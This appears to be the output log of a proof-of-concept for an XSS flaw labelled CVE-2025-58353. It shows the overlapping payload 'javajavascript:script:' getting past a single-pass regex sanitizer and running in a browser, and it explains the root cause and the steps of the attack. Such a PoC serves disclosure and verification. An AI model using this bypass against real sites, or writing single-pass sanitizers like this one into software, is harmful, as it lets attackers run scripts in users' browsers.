============================================================
CVE-2025-58353 - Sanitizer Bypass XSS PoC
============================================================

[*] Testing sanitizer bypass via overlapping patterns

Payload: javajavascript:script:window.XSS_EXECUTED=true
Sanitized: javascript:window.XSS_EXECUTED=true

[VULNERABLE] Dangerous 'javascript:' protocol still present!

============================================================
Browser XSS Execution Test
============================================================

[*] Created link with sanitized href: javascript:window.XSS_EXECUTED=true
[*] Clicked the link to trigger XSS
[*] Checking window.XSS_EXECUTED value...

Result: { "XSS_EXECUTED": true }

[+] XSS SUCCESSFULLY EXECUTED!

============================================================
Vulnerability Type
============================================================

Type: DOM-based XSS (can become Stored XSS if data is persisted)
Vector: javascript: URL scheme in href attribute
Root Cause: Single-pass regex replacement allows overlapping bypass

Attack Flow:
1. Attacker crafts payload: "javajavascript:script:alert(1)"
2. sanitizeInput() removes "javascript:" once
3. Result: "javascript:alert(1)" (still dangerous)
4. When used in href/src and clicked, XSS triggers

============================================================
Summary
============================================================

[+] VULNERABILITY CONFIRMED AND EXPLOITED
[+] Arbitrary JavaScript execution achieved via sanitizer bypass
[+] Proof: window.XSS_EXECUTED was set to true by the payload

